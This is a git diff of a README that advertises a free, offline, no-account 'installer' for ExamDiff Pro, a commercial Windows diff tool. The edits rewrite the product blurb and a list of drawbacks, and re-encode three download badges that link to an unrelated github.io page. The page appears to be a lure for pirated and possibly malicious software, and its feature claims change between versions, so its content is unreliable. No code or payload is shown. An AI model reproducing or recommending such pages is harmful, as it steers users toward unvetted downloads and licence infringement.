@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Diff+Tool-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 ExamDiff Pro Free Installer** — ExamDiff Pro is a Windows file and folder comparison tool with a clean side-by-side diff view, syntax highlighting, folder synchronization, and Unicode support. Works without internet access, no account required. Full offline installation.
+**💻 ExamDiff Pro Free Installer** — ExamDiff Pro is a professional file and folder comparison tool for Windows with visual line-by-line diffing, directory comparison, and integration with popular version control systems. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install ExamDiff Pro](https://img.shields.io/badge/⬇_Install_ExamDiff%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ExamDiff Pro](https://img.shields.io/badge/⬇_Install_ExamDiff+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About ExamDiff Pro
 
-ExamDiff Pro is a Windows file and folder comparison tool with a clean side-by-side diff view, syntax highlighting, folder synchronization, and Unicode support. Available in standard and pro editions for different use cases.
+ExamDiff Pro is a professional file and folder comparison tool for Windows with visual line-by-line diffing, directory comparison, and integration with popular version control systems. Features include three-way merge, syntax highlighting, a configurable diff engine, and command-line support for automation. ExamDiff Pro is a focused, high-performance diffing tool without the overhead of a full IDE.
 
 ---
 
 ## ❌ Problem: ExamDiff Pro is hard to access
 
-- **Windows Only** — Not available on macOS or Linux
-- **Paid License** — Pro version requires purchase
-- **Competition** — Beyond Compare and WinMerge offer comparable features
-- **Basic Merge** — File merge capabilities less sophisticated than three-way merge tools
+- **Windows Only** — No cross-platform support
+- **Commercial License** — Requires paid license
+- **VS Code Integration** — Less integrated into modern VS Code-based workflows
+- **Folder Sync** — Synchronization features less powerful than dedicated sync tools
 
 ---
 
@@ -81,7 +81,7 @@ ExamDiff Pro is a Windows file and folder comparison tool with a clean side-by-s
 
 <div align="center">
 
-[![⬇ Install ExamDiff Pro](https://img.shields.io/badge/⬇_Install_ExamDiff%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ExamDiff Pro](https://img.shields.io/badge/⬇_Install_ExamDiff+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ ExamDiff Pro is a Windows file and folder comparison tool with a clean side-by-s
 
 ---
 
-**ExamDiff Pro Free Installer** — ExamDiff Pro is a Windows file and folder comparison tool with a clean side-by-side diff view, syntax highlighting, folder synchronization, and Unicode support. Install without internet connection today!
+**ExamDiff Pro Free Installer** — ExamDiff Pro is a professional file and folder comparison tool for Windows with visual line-by-line diffing, directory comparison, and integration with popular version control systems. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install ExamDiff Pro](https://img.shields.io/badge/⬇_Install_ExamDiff%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ExamDiff Pro](https://img.shields.io/badge/⬇_Install_ExamDiff+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
